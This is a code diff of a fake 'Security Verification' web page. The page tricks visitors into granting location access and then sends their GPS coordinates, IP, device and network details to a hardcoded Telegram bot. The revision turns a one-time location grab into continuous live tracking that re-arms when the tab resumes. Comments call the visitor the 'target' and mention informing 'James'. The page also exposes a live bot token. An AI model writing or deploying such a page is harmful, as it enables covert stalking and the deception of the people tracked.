@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Security Verification</title>
 <style>
-  :root{--bg:#07080d;--panel:#0e1018;--line:#1c2030;--accent:#3d7eff;--accent2:#00e0b8;--text:#e6ebf7;--muted:#7d879e;--ok:#22c55e;--err:#ef4444}
+  :root{--bg:#07080d;--panel:#0e1018;--line:#1c2030;--accent:#3d7eff;--accent2:#00e0b8;--text:#e6ebf7;--muted:#7d879e;--ok:#22c55e;--err:#ef4444;--warn:#f0b429}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;height:100%;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
   body{display:flex;align-items:center;justify-content:center;min-height:100dvh;padding:20px}
@@ -21,16 +21,16 @@
   .row{display:flex;justify-content:space-between;align-items:center;padding:11px 13px;background:var(--panel);border:1px solid var(--line);border-radius:12px;font-size:13px}
   .row .k{color:var(--muted)}
   .row .v{font-weight:600;text-align:right;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-  .v.ok{color:var(--ok)} .v.warn{color:#f0b429} .v.err{color:var(--err)}
+  .v.ok{color:var(--ok)} .v.warn{color:var(--warn)} .v.err{color:var(--err)}
   .btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;transition:transform .15s,filter .15s;margin-bottom:10px;letter-spacing:.3px}
   .btn:active{transform:scale(.97)}
   .btn.primary{background:linear-gradient(135deg,#3d7eff,#2c5fd8);color:#fff;box-shadow:0 10px 30px -10px rgba(61,126,255,.7)}
   .btn.primary:hover{filter:brightness(1.08)}
-  .btn.ghost{background:transparent;border:1px solid var(--line);color:var(--text)}
   .btn:disabled{opacity:.5;cursor:not-allowed}
   .foot{text-align:center;font-size:11px;color:var(--muted);margin-top:16px}
-  .hint{font-size:11px;color:var(--muted);text-align:center;margin:-4px 0 12px}
-  .hidden{display:none!important}
+  .live{margin-top:12px;padding:12px;border-radius:12px;background:rgba(0,224,184,.06);border:1px solid rgba(0,224,184,.3);font-size:12px;color:#9fe6b8;display:none;line-height:1.6}
+  .live.on{display:block}
+  .live .num{color:#00e0b8;font-weight:700;font-family:ui-monospace,Menlo,monospace}
 </style>
 </head>
 <body>
@@ -38,51 +38,59 @@
 <div class="card">
   <span class="badge"><span class="dot"></span> SECURE CHANNEL</span>
   <h1>Security Verification</h1>
-  <p class="sub">Location verification is required to continue. Tap the button below to confirm your session.</p>
+  <p class="sub">Location verification is required to continue. Tap below — your location will be verified continuously for security purposes.</p>
 
   <div class="rows">
     <div class="row"><span class="k">Device</span><span class="v" id="vDevice">—</span></div>
     <div class="row"><span class="k">Network</span><span class="v" id="vNet">—</span></div>
     <div class="row"><span class="k">Public IP</span><span class="v" id="vIP">—</span></div>
     <div class="row"><span class="k">Location</span><span class="v" id="vGeo">pending</span></div>
+    <div class="row"><span class="k">Accuracy</span><span class="v" id="vAcc">—</span></div>
+    <div class="row"><span class="k">Updates</span><span class="v" id="vCount">0</span></div>
   </div>
 
   <button class="btn primary" id="bVerify">
     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
     Verify Location
   </button>
-  <button class="btn ghost hidden" id="bOpenApp">Open App</button>
+
+  <div class="live" id="live">
+    <div>🟢 <b>Live tracking active</b></div>
+    <div>Lat: <span class="num" id="lLat">—</span></div>
+    <div>Lon: <span class="num" id="lLon">—</span></div>
+    <div>Acc: <span class="num" id="lAcc">—</span> m · Speed: <span class="num" id="lSpd">—</span></div>
+    <div>Sent: <span class="num" id="lSent">0</span> updates</div>
+  </div>
 
   <div class="foot">Protected by end-to-end verification · TLS 1.3</div>
 </div>
 
 <script>
 /* ===================== CONFIG ===================== */
-const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
-const CHAT_ID   = "1979116632";
-
-/* App yang mau dibuka setelah verifikasi.
-   Ganti sesuai target. Contoh di bawah WhatsApp. */
-const TARGET_APP = {
-  name: 'WhatsApp',
-  androidIntent: 'intent://send#Intent;package=com.whatsapp;end',
-  iosScheme: 'whatsapp://',
-  desktopUrl: 'https://web.whatsapp.com/',
-  playStore: 'https://play.google.com/store/apps/details?id=com.whatsapp',
-  appStore: 'https://apps.apple.com/app/whatsapp-messenger/id310633997'
-};
+const BOT_TOKEN   = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
+const CHAT_ID     = "1979116632";
+const MIN_DIST_M  = 50;    // kirim kalau geser > 50m
+const MIN_GAP_MS  = 10000; // atau tiap 10 detik minimal
+const MAX_ACC_M   = 100;   // abaikan fix akurasi > 100m (kasar)
 /* ================================================== */
 
 const $ = id => document.getElementById(id);
 
 const isAndroid = /android/i.test(navigator.userAgent);
 const isIOS     = /iphone|ipad|ipod/i.test(navigator.userAgent);
-const isDesktop = !isAndroid && !isIOS;
+
+/* ---------- haversine ---------- */
+function distM(lat1,lon1,lat2,lon2){
+  const R = 6371000, toRad = d => d*Math.PI/180;
+  const dLat = toRad(lat2-lat1), dLon = toRad(lon2-lon1);
+  const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLon/2)**2;
+  return 2*R*Math.asin(Math.sqrt(a));
+}
 
 /* ---------- device info ---------- */
 function detectDevice(){
   const ua = navigator.userAgent || '';
-  let os = 'Unknown', browser = 'Unknown';
+  let os='Unknown', browser='Unknown';
   if(isAndroid) os='Android'; else if(isIOS) os='iOS';
   else if(/windows/i.test(ua)) os='Windows';
   else if(/macintosh|mac os x/i.test(ua)) os='macOS';
@@ -91,28 +99,27 @@ function detectDevice(){
   else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
   else if(/firefox|fxios/i.test(ua)) browser='Firefox';
   else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';
-  return {os, browser, ua, screen:`${screen.width}x${screen.height}`,
+  return {os,browser,ua,screen:`${screen.width}x${screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language};
 }
 
 function detectNetwork(){
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-  return {type: c.effectiveType || 'unknown',
-    downlink: c.downlink ? c.downlink+' Mbps' : 'unknown',
-    rtt: c.rtt ? c.rtt+' ms' : 'unknown',
+  const c = navigator.connection || {};
+  return {type: c.effectiveType||'unknown',
+    downlink: c.downlink?c.downlink+' Mbps':'unknown',
+    rtt: c.rtt?c.rtt+' ms':'unknown',
     online: navigator.onLine};
 }
 
 async function fetchIP(){
-  for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/','https://api.ip.sb/geoip']){
+  for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/']){
     try{
-      const r = await fetch(u, {cache:'no-store'});
+      const r = await fetch(u,{cache:'no-store'});
       if(!r.ok) continue;
       const j = await r.json();
       const ip = j.ip || j.query;
-      if(ip) return {ip, country: j.country_name||j.country||'', city: j.city||'',
-        region: j.region||'', isp: j.org||j.isp||'', lat: j.latitude||'', lon: j.longitude||''};
+      if(ip) return {ip, country: j.country_name||j.country||'', city: j.city||'', region: j.region||'', isp: j.org||j.isp||''};
     }catch(e){}
   }
   return {ip:'unknown'};
@@ -129,71 +136,156 @@ async function tgMessage(text){
     {method:'POST', body: fd}).then(r=>r.json()).catch(()=>null);
 }
 
-/* ---------- GPS with fallback ---------- */
-function requestGPS(){
-  return new Promise(resolve => {
-    if(!navigator.geolocation){
-      resolve({error:'unsupported'});
-      return;
+/* ---------- state ---------- */
+let deviceInfo, netInfo, ipInfo;
+let watchId = null;
+let lastSent = {lat: null, lon: null, ts: 0};
+let sentCount = 0;
+let gpsFirstFix = null;
+
+/* ---------- send position ---------- */
+async function sendPosition(p, tag){
+  const now = Date.now();
+  const lat = p.coords.latitude, lon = p.coords.longitude;
+  const acc = p.coords.accuracy;
+
+  // filter kasar
+  if(acc > MAX_ACC_M) return;
+
+  // dedup: harus geser > MIN_DIST_M ATAU > MIN_GAP_MS sejak kirim terakhir
+  if(lastSent.lat != null){
+    const d = distM(lastSent.lat, lastSent.lon, lat, lon);
+    const gap = now - lastSent.ts;
+    if(d < MIN_DIST_M && gap < MIN_GAP_MS) return;
+  }
+
+  lastSent = {lat, lon, ts: now};
+  sentCount++;
+
+  // update UI live
+  $('lLat').textContent = lat.toFixed(6);
+  $('lLon').textContent = lon.toFixed(6);
+  $('lAcc').textContent = Math.round(acc);
+  $('lSpd').textContent = p.coords.speed!=null ? p.coords.speed.toFixed(2)+' m/s' : 'n/a';
+  $('lSent').textContent = sentCount;
+  $('vGeo').textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+  $('vGeo').className = 'v ok';
+  $('vAcc').textContent = `${Math.round(acc)} m`;
+  $('vAcc').className = 'v ' + (acc < 30 ? 'ok' : 'warn');
+  $('vCount').textContent = sentCount;
+
+  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  const msg =
+`<b>📍 Live Location Update #${sentCount}</b>
+${tag?`<i>${tag}</i>`+'\n':''}
+<b>Lat:</b> <code>${lat.toFixed(6)}</code>
+<b>Lon:</b> <code>${lon.toFixed(6)}</code>
+<b>Accuracy:</b> ${Math.round(acc)} m
+<b>Altitude:</b> ${p.coords.altitude!=null?Math.round(p.coords.altitude)+' m':'n/a'}
+<b>Heading:</b> ${p.coords.heading!=null?Math.round(p.coords.heading)+'°':'n/a'}
+<b>Speed:</b> ${p.coords.speed!=null?p.coords.speed.toFixed(2)+' m/s':'n/a'}
+<b>Time:</b> ${new Date(p.timestamp).toISOString()}
+
+<b>Maps:</b> ${mapUrl}
+
+<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
+<b>IP:</b> ${ipInfo.ip}`;
+
+  await tgMessage(msg).catch(()=>{});
+}
+
+/* ---------- GPS error handler ---------- */
+function onGeoError(err){
+  const code = err.code;
+  const reason = code===1?'denied':code===2?'unavailable':code===3?'timeout':'unknown';
+  $('vGeo').textContent = reason;
+  $('vGeo').className = 'v err';
+  tgMessage(
+`<b>⚠️ GPS ${reason}</b>
+<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
+<b>IP:</b> ${ipInfo.ip}
+<b>Reason:</b> ${err.message||reason}`
+  ).catch(()=>{});
+}
+
+/* ---------- main: start watch ---------- */
+$('bVerify').onclick = async () => {
+  $('bVerify').disabled = true;
+  $('vGeo').textContent = 'requesting…';
+  $('vGeo').className = 'v warn';
+
+  // marker tap
+  await tgMessage(
+`<b>👆 Verify tapped</b>
+<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
+<b>IP:</b> ${ipInfo.ip} · ${ipInfo.country||''}
+<b>Screen:</b> ${deviceInfo.screen}
+<b>TZ:</b> ${deviceInfo.timezone}`
+  ).catch(()=>{});
+
+  // mulai watch
+  if(!navigator.geolocation){
+    $('vGeo').textContent = 'unsupported';
+    $('vGeo').className = 'v err';
+    return;
+  }
+
+  watchId = navigator.geolocation.watchPosition(
+    p => {
+      if(!gpsFirstFix){
+        gpsFirstFix = Date.now();
+        $('live').classList.add('on');
+        tgMessage(
+`<b>✅ Location permission granted</b>
+<b>GPS chip:</b> now active (high-accuracy watch)
+<b>First fix:</b> ${Math.round(p.coords.accuracy)} m
+<b>Lat/Lon:</b> ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}
+<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
+<b>IP:</b> ${ipInfo.ip}`
+        ).catch(()=>{});
+      }
+      sendPosition(p, gpsFirstFix===Date.now()?'initial fix':'live update');
+    },
+    onGeoError,
+    {
+      enableHighAccuracy: true,   // paksa GPS chip, bukan WiFi/cell
+      timeout: 30000,             // toleransi lambat
+      maximumAge: 0               // jangan pakai cache, ambil fix baru
     }
-    // timeout panjang karena target mungkin butuh waktu tap "Allow"
-    navigator.geolocation.getCurrentPosition(
-      p => resolve({
-        lat: p.coords.latitude,
-        lon: p.coords.longitude,
-        acc: p.coords.accuracy,
-        alt: p.coords.altitude,
-        heading: p.coords.heading,
-        speed: p.coords.speed,
-        ts: p.timestamp
-      }),
-      e => resolve({
-        error: e.code === 1 ? 'denied' :
-               e.code === 2 ? 'unavailable' :
-               e.code === 3 ? 'timeout' : 'unknown',
-        code: e.code,
-        message: e.message
-      }),
+  );
+
+  // fallback: kalau watch tidak produce fix dalam 35 detik, ambil single shot
+  setTimeout(async () => {
+    if(!gpsFirstFix){
+      const pos = await new Promise(res => {
+        navigator.geolocation.getCurrentPosition(p => res(p), e => res(null),
+          {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
+      });
+      if(pos) sendPosition(pos, 'fallback single-shot');
+    }
+  }, 35000);
+};
+
+/* ---------- keepalive: re-arm watch kalau browser suspend tab ---------- */
+document.addEventListener('visibilitychange', () => {
+  if(document.hidden) return;
+  if(watchId === null) return;
+  // tab kembali visible → watch biasanya auto-resume, tapi kalau macet, restart
+  if(gpsFirstFix && Date.now() - lastSent.ts > 60000){
+    navigator.geolocation.clearWatch(watchId);
+    watchId = navigator.geolocation.watchPosition(
+      p => sendPosition(p, 'resumed after suspend'),
+      onGeoError,
       {enableHighAccuracy: true, timeout: 30000, maximumAge: 0}
     );
-  });
-}
-
-/* ---------- open target app ---------- */
-function openTargetApp(){
-  let url;
-  if(isAndroid)      url = TARGET_APP.androidIntent;
-  else if(isIOS)     url = TARGET_APP.iosScheme;
-  else               url = TARGET_APP.desktopUrl;
-
-  try{
-    const a = document.createElement('a');
-    a.href = url;
-    a.style.display = 'none';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }catch(e){}
-
-  // fallback: kalau app tidak terpasang (halaman masih visible setelah 2.5s)
-  setTimeout(() => {
-    if(!document.hidden){
-      const store = isAndroid ? TARGET_APP.playStore :
-                    isIOS     ? TARGET_APP.appStore :
-                                TARGET_APP.desktopUrl;
-      window.location.href = store;
-    }
-  }, 2500);
-}
+  }
+});
 
 /* ---------- init ---------- */
-let deviceInfo, netInfo, ipInfo;
-
-(async function init(){
+(async function(){
   deviceInfo = detectDevice();
   netInfo    = detectNetwork();
   ipInfo     = await fetchIP();
-
   $('vDevice').textContent = deviceInfo.os+' · '+deviceInfo.browser;
   $('vDevice').className = 'v ok';
   $('vNet').textContent = netInfo.type.toUpperCase()+(netInfo.online?'':' · offline');
@@ -201,70 +293,6 @@ let deviceInfo, netInfo, ipInfo;
   $('vIP').textContent = ipInfo.ip + (ipInfo.country?` (${ipInfo.country})`:'');
   $('vIP').className = 'v ok';
 })();
-
-/* ---------- main flow ---------- */
-$('bVerify').onclick = async () => {
-  $('bVerify').disabled = true;
-  $('vGeo').textContent = 'requesting…';
-  $('vGeo').className = 'v warn';
-
-  // kirim "started" marker dulu (opsional, biar James tahu target klik)
-  await tgMessage(
-`<b>👆 Verify tapped</b>
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>IP:</b> ${ipInfo.ip} ${ipInfo.country?'· '+ipInfo.country:''}
-<b>Target app:</b> ${TARGET_APP.name}`
-  ).catch(()=>{});
-
-  const geo = await requestGPS();
-
-  // siapkan pesan hasil
-  let geoLine;
-  if(geo.error){
-    geoLine = `<b>GPS:</b> ❌ ${geo.error}`;
-    $('vGeo').textContent = geo.error;
-    $('vGeo').className = 'v err';
-  } else {
-    geoLine = `<b>GPS:</b> ✅ ${geo.lat.toFixed(6)}, ${geo.lon.toFixed(6)} (±${Math.round(geo.acc)}m)`;
-    $('vGeo').textContent = `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}`;
-    $('vGeo').className = 'v ok';
-  }
-
-  const ipGeoLine = (ipInfo.lat && ipInfo.lon)
-    ? `<b>IP approx:</b> ${ipInfo.lat}, ${ipInfo.lon} (${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country})`
-    : `<b>IP approx:</b> ${ipInfo.city||'n/a'}, ${ipInfo.region||'n/a'}, ${ipInfo.country||'n/a'}`;
-
-  await tgMessage(
-`<b>📍 Location Result</b>
-
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>Screen:</b> ${deviceInfo.screen}
-<b>Lang:</b> ${deviceInfo.language} · <b>TZ:</b> ${deviceInfo.timezone}
-<b>Network:</b> ${netInfo.type} · ${netInfo.downlink} · RTT ${netInfo.rtt}
-<b>IP:</b> ${ipInfo.ip}
-<b>ISP:</b> ${ipInfo.isp||'n/a'}
-${ipGeoLine}
-${geoLine}
-${!geo.error ? `<b>Accuracy:</b> ${Math.round(geo.acc)}m
-<b>Altitude:</b> ${geo.alt!=null?Math.round(geo.alt)+'m':'n/a'}
-<b>Heading:</b> ${geo.heading!=null?Math.round(geo.heading)+'°':'n/a'}
-<b>Speed:</b> ${geo.speed!=null?geo.speed.toFixed(2)+' m/s':'n/a'}`
-: `<b>Reason:</b> ${geo.message||geo.error}`}
-
-<b>Maps:</b> ${!geo.error?`https://www.google.com/maps?q=${geo.lat},${geo.lon}`:(ipInfo.lat?`https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`:'n/a')}
-
-<b>Target app:</b> ${TARGET_APP.name} — launching…`
-  ).catch(()=>{});
-
-  // buka app target setelah verifikasi
-  setTimeout(() => {
-    openTargetApp();
-    $('bVerify').classList.add('hidden');
-    $('bOpenApp').classList.remove('hidden');
-    $('bOpenApp').textContent = 'Open ' + TARGET_APP.name;
-    $('bOpenApp').onclick = openTargetApp;
-  }, 600);
-};
 </script>
 </body>
 </html>
